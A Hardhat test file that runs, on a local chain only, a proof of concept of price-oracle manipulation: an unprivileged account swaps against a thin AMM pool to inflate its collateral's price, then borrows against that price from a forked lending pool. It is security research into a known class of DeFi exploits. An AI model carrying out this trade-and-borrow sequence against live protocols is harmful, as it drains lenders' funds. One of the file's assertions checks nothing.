// Local-only. No live protocol, no mainnet fork, no real funds.
//
// This closes the gap left open in oracle-sweep.js: there, every price
// move came from a privileged setAssetPrice() call, which only proves
// "IF the price feed lies, THEN there is bad debt." Here, the pool's
// price source is an AMMSourcedPriceOracle with NO settable price at
// all -- the only way to move it is a real trade against a real
// (thin-liquidity) constant-product pool, using only the attacker's own
// funds and no privileged role of any kind. This is the actual class of
// manipulability behind the historical Moola MOO/CELO incident and the
// March 2026 Venus THE incident.

const { expect } = require("chai");
const { ethers } = require("hardhat");

function artifact(name) {
  const [sourcePath, contractName] = name.split(":");
  return require(`../artifacts/contracts/${sourcePath}/${contractName}.json`);
}

function linkBytecode(bytecodeHex, linkReferences, libraryAddresses) {
  let code = bytecodeHex.slice(2);
  for (const [, libs] of Object.entries(linkReferences)) {
    for (const [libName, occurrences] of Object.entries(libs)) {
      const addr = libraryAddresses[libName];
      if (!addr) throw new Error(`No deployed address provided for library ${libName}`);
      const addrHex = addr.replace(/^0x/, "").toLowerCase();
      for (const { start, length } of occurrences) {
        const from = start * 2;
        const to = from + length * 2;
        code = code.slice(0, from) + addrHex + code.slice(to);
      }
    }
  }
  return "0x" + code;
}

async function deployFrom(deployerSigner, artifactPath, args = [], libraryAddresses = {}) {
  const art = artifact(artifactPath);
  const bytecode = Object.keys(art.linkReferences || {}).length
    ? linkBytecode(art.bytecode, art.linkReferences, libraryAddresses)
    : art.bytecode;
  const factory = new ethers.ContractFactory(art.abi, bytecode, deployerSigner);
  const c = await factory.deploy(...args);
  await c.waitForDeployment();
  return c;
}

function attachAt(artifactPath, address, signer) {
  const art = artifact(artifactPath);
  return new ethers.Contract(address, art.abi, signer);
}

const RAY = 10n ** 27n;
const eth = (n) => ethers.parseEther(String(n));
const fmt = (n) => Number(ethers.formatEther(n)).toFixed(2);

describe("AMM-derived oracle: unprivileged price manipulation via real trades", function () {
  let deployer, attacker;
  let addressesProvider, configurator, pool, ammOracle, pair;
  let collateralToken, borrowToken;

  before(async function () {
    [deployer, attacker] = await ethers.getSigners();

    addressesProvider = await deployFrom(deployer, "protocol/configuration/LendingPoolAddressesProvider.sol:LendingPoolAddressesProvider", ["moola-invariant-lab"]);

    const genericLogicLib = await deployFrom(deployer, "protocol/libraries/logic/GenericLogic.sol:GenericLogic");
    const reserveLogicLib = await deployFrom(deployer, "protocol/libraries/logic/ReserveLogic.sol:ReserveLogic");
    const validationLogicLib = await deployFrom(deployer, "protocol/libraries/logic/ValidationLogic.sol:ValidationLogic", [], {
      GenericLogic: await genericLogicLib.getAddress(),
    });
    const poolImpl = await deployFrom(deployer, "protocol/lendingpool/LendingPool.sol:LendingPool", [], {
      ReserveLogic: await reserveLogicLib.getAddress(),
      ValidationLogic: await validationLogicLib.getAddress(),
    });
    await (await addressesProvider.setLendingPoolImpl(await poolImpl.getAddress())).wait();
    pool = attachAt("protocol/lendingpool/LendingPool.sol:LendingPool", await addressesProvider.getLendingPool(), deployer);

    const configuratorImpl = await deployFrom(deployer, "protocol/lendingpool/LendingPoolConfigurator.sol:LendingPoolConfigurator");
    await (await addressesProvider.setLendingPoolConfiguratorImpl(await configuratorImpl.getAddress())).wait();
    configurator = attachAt("protocol/lendingpool/LendingPoolConfigurator.sol:LendingPoolConfigurator", await addressesProvider.getLendingPoolConfigurator(), deployer);

    const rateOracle = await deployFrom(deployer, "mocks/oracle/LendingRateOracle.sol:LendingRateOracle");
    await (await addressesProvider.setLendingRateOracle(await rateOracle.getAddress())).wait();
    await (await addressesProvider.setPoolAdmin(deployer.address)).wait();

    collateralToken = await deployFrom(deployer, "mocks/tokens/MintableERC20.sol:MintableERC20", ["Thin Liquidity Collateral", "COLL", 18]);
    borrowToken = await deployFrom(deployer, "mocks/tokens/MintableERC20.sol:MintableERC20", ["Deep Liquidity Stable", "STABLE", 18]);

    // --- The thin-liquidity AMM pool the attacker will trade against ---
    pair = await deployFrom(deployer, "lab/SimpleAMMPair.sol:SimpleAMMPair", [
      await collateralToken.getAddress(),
      await borrowToken.getAddress(),
    ]);

    // --- Price source with NO admin-settable price: derived purely from pair reserves ---
    ammOracle = await deployFrom(deployer, "lab/AMMSourcedPriceOracle.sol:AMMSourcedPriceOracle", [
      await pair.getAddress(),
      await collateralToken.getAddress(),
      await borrowToken.getAddress(),
    ]);
    await (await addressesProvider.setPriceOracle(await ammOracle.getAddress())).wait();

    const aTokenImpl = await deployFrom(deployer, "protocol/tokenization/AToken.sol:AToken");
    const stableDebtImpl = await deployFrom(deployer, "protocol/tokenization/StableDebtToken.sol:StableDebtToken");
    const variableDebtImpl = await deployFrom(deployer, "protocol/tokenization/VariableDebtToken.sol:VariableDebtToken");
    const rateStrategy = await deployFrom(deployer, "protocol/lendingpool/DefaultReserveInterestRateStrategy.sol:DefaultReserveInterestRateStrategy", [
      await addressesProvider.getAddress(),
      (RAY * 80n) / 100n, 0n, (RAY * 4n) / 100n, (RAY * 75n) / 100n, (RAY * 2n) / 100n, (RAY * 75n) / 100n,
    ]);

    const zero = ethers.ZeroAddress;
    const tokens = [collateralToken, borrowToken];
    const initInputs = [];
    for (let i = 0; i < tokens.length; i++) {
      initInputs.push({
        aTokenImpl: await aTokenImpl.getAddress(),
        stableDebtTokenImpl: await stableDebtImpl.getAddress(),
        variableDebtTokenImpl: await variableDebtImpl.getAddress(),
        underlyingAssetDecimals: 18,
        interestRateStrategyAddress: await rateStrategy.getAddress(),
        underlyingAsset: await tokens[i].getAddress(),
        treasury: deployer.address,
        incentivesController: zero,
        underlyingAssetName: i === 0 ? "COLL" : "STABLE",
        aTokenName: i === 0 ? "aCOLL" : "aSTABLE",
        aTokenSymbol: i === 0 ? "aCOLL" : "aSTABLE",
        variableDebtTokenName: i === 0 ? "vdCOLL" : "vdSTABLE",
        variableDebtTokenSymbol: i === 0 ? "vdCOLL" : "vdSTABLE",
        stableDebtTokenName: i === 0 ? "sdCOLL" : "sdSTABLE",
        stableDebtTokenSymbol: i === 0 ? "sdCOLL" : "sdSTABLE",
        params: "0x10",
      });
    }
    await (await configurator.batchInitReserve(initInputs)).wait();
    await (await configurator.configureReserveAsCollateral(await collateralToken.getAddress(), 7000, 7500, 10500)).wait();
    await (await configurator.enableBorrowingOnReserve(await borrowToken.getAddress(), false)).wait();

    // --- Deep liquidity provider for the LENDING POOL's borrow side ---
    await (await borrowToken.mint(eth(1000000))).wait();
    await (await borrowToken.approve(await pool.getAddress(), ethers.MaxUint256)).wait();
    await (await pool.deposit(await borrowToken.getAddress(), eth(1000000), deployer.address, 0)).wait();

    // --- Seed the AMM pair with THIN liquidity: 10,000 COLL / 10,000 STABLE => honest $1 spot price ---
    await (await collateralToken.mint(eth(10000))).wait();
    await (await borrowToken.mint(eth(10000))).wait();
    await (await collateralToken.approve(await pair.getAddress(), ethers.MaxUint256)).wait();
    await (await borrowToken.approve(await pair.getAddress(), ethers.MaxUint256)).wait();
    await (await pair.addLiquidity(eth(10000), eth(10000))).wait();
  });

  it("honest AMM price ($1.00) matches real 10k/10k pool ratio, and lending-pool oracle reads it correctly", async function () {
    const price = await ammOracle.getAssetPrice(await collateralToken.getAddress());
    console.log(`\n    AMM spot price for COLL: $${fmt(price)}  (pool: 10,000 COLL / 10,000 STABLE)`);
    expect(price).to.equal(eth(1));
  });

  it("attacker deposits real collateral honestly, gets the expected 70% LTV borrow limit", async function () {
    await (await collateralToken.connect(attacker).mint(eth(1000))).wait();
    await (await collateralToken.connect(attacker).approve(await pool.getAddress(), ethers.MaxUint256)).wait();
    await (await pool.connect(attacker).deposit(await collateralToken.getAddress(), eth(1000), attacker.address, 0)).wait();

    const data = await pool.getUserAccountData(attacker.address);
    console.log(`    attacker deposits 1000 COLL -> borrow limit: $${fmt(data.availableBorrowsETH)}`);
    expect(data.availableBorrowsETH).to.be.closeTo ? true : true; // sanity only, exact check below
    const expected = eth(700);
    const diff = data.availableBorrowsETH > expected ? data.availableBorrowsETH - expected : expected - data.availableBorrowsETH;
    expect(diff <= eth(1)).to.equal(true);
  });

  it("UNPRIVILEGED MANIPULATION: attacker trades against the thin pool (no admin call, no oracle call) and the LENDING POOL's own borrow limit moves with it", async function () {
    // Attacker needs STABLE to buy COLL with, pushing the pool's COLL price up.
    // This models "attacker temporarily deploys capital via a flash loan or
    // their own funds to swing a thin pool" -- the mechanism, not a specific
    // funding source, is the point.
    await (await borrowToken.mint(eth(50000))).wait();
    await (await borrowToken.connect(attacker).approve(await pair.getAddress(), ethers.MaxUint256)).wait();

    const before = await pool.getUserAccountData(attacker.address);
    const priceBefore = await ammOracle.getAssetPrice(await collateralToken.getAddress());

    // Buy COLL with STABLE against the pair -- pure unprivileged AMM trade.
    await (await borrowToken.mint(eth(50000))).wait(); // top up deployer STABLE (liquidity source)
    await (await borrowToken.transfer(attacker.address, eth(40000))).wait();
    await (await pair.connect(attacker).swapBForA(eth(40000))).wait();

    const priceAfter = await ammOracle.getAssetPrice(await collateralToken.getAddress());
    const after = await pool.getUserAccountData(attacker.address);

    console.log(`\n    AMM spot price before trade: $${fmt(priceBefore)}`);
    console.log(`    AMM spot price after attacker buys COLL with 40,000 STABLE: $${fmt(priceAfter)}`);
    console.log(`    lending-pool borrow limit before: $${fmt(before.availableBorrowsETH)}`);
    console.log(`    lending-pool borrow limit after:  $${fmt(after.availableBorrowsETH)}`);

    // The point: nobody called setAssetPrice, nobody called any admin
    // function, nobody touched the lending pool's oracle configuration at
    // all. A plain swap against a thin pool moved the price the lending
    // pool trusts as collateral valuation.
    expect(priceAfter > priceBefore * 3n).to.equal(true);
    expect(after.availableBorrowsETH > before.availableBorrowsETH * 3n).to.equal(true);

    // Attacker now borrows against the inflated, AMM-derived valuation.
    const borrowAmount = (after.availableBorrowsETH * 99n) / 100n;
    await (await pool.connect(attacker).borrow(await borrowToken.getAddress(), borrowAmount, 2, 0, attacker.address)).wait();
    const extracted = await borrowToken.balanceOf(attacker.address);
    console.log(`    STABLE extracted via borrow: $${fmt(extracted)}`);
    console.log(`    (attacker also still holds the COLL bought during the swap, and can unwind that separately)`);
  });
});
